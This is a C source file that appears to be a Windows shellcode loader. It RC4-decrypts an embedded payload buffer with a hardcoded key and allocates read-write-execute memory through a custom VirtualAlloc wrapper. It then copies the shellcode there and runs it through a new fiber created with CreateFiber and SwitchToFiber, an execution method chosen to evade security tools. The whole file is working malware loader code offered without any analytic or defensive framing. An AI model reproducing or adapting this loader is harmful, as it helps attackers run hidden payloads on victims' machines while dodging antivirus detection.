#include <Windows.h>
#include <iostream>

#include "CustomVirtualAlloc.h"
#include "payload.h"
#include "rc4.h"
#include "crt.h"

#pragma comment(linker, "/ENTRY:FiberMaster")

INT MCRT_FN mini_strlen(const PCHAR str)
{
	INT i = 0;
	while (str[i] != '\0') {
		i++;
	}
	return i;
}

PVOID MCRT_FN mini_memcpy(PVOID dest, PVOID src, UINT len)
{
	UINT i;
	PCHAR char_src = (PCHAR)src;
	PCHAR char_dest = (PCHAR)dest;
	for (i = 0; i < len; i++) {
		char_dest[i] = char_src[i];
	}
	return dest;
}

INT FiberMaster(VOID)
{

	CHAR key[] = "12345678"; 

	struct rc4_state* s;
	s = (struct rc4_state*)malloc(sizeof(struct rc4_state));

	rc4_setup(s, (PUCHAR)key, mini_strlen(key));
	rc4_crypt(s, (PUCHAR)buf, mini_strlen((const PCHAR)buf));   

	// convert main thread to fiber
	PVOID mainFiber = ConvertThreadToFiber(NULL);

	PVOID shellcodeLocation = CustomVirtualAlloc(sizeof(buf), RWX);

	mini_memcpy(shellcodeLocation, buf, sizeof buf);

	//	create a fiber that will execute the shellcode
	PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);

	// manually schedule the fiber that will execute our shellcode
	SwitchToFiber(shellcodeFiber);

	return ERROR_SUCCESS;

}